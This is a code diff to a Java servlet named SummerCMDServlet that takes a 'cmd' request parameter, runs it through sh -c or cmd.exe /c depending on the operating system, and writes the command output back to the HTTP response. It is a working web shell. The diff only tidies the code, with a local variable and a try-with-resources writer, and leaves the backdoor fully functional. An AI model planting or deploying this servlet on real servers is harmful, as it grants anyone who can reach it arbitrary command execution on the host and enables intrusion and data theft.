@@ -2,6 +2,7 @@ package com.summer233;
 
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.PrintWriter;
 import java.util.Scanner;
 
 import javax.servlet.Servlet;
@@ -31,20 +32,22 @@ public class SummerCMDServlet implements Servlet {
       servletResponse.setCharacterEncoding("UTF-8");
       servletResponse.getWriter().println("this is a SummerCMDServlet<br>");
       HttpServletRequest req = (HttpServletRequest) servletRequest;
-      if (req.getParameter("cmd") != null) {
+      String cmd = req.getParameter("cmd");
+      if (cmd != null) {
          boolean isLinux = true;
          String osTyp = System.getProperty("os.name");
          if (osTyp != null && osTyp.toLowerCase().contains("win")) {
             isLinux = false;
          }
-         String[] cmds = isLinux ? new String[] { "sh", "-c", req.getParameter("cmd") }
-               : new String[] { "cmd.exe", "/c", req.getParameter("cmd") };
+         String[] cmds = isLinux ? new String[] { "sh", "-c", cmd }
+               : new String[] { "cmd.exe", "/c", cmd };
          InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
          Scanner s = new Scanner(in).useDelimiter("\\a");
          String output = s.hasNext() ? s.next() : "";
-         servletResponse.getWriter().write(output);
-         servletResponse.getWriter().flush();
-         servletResponse.getWriter().close();
+         try (PrintWriter responseWriter = servletResponse.getWriter()) {
+            responseWriter.println(output);
+            responseWriter.flush();
+         }
       }
    }
 
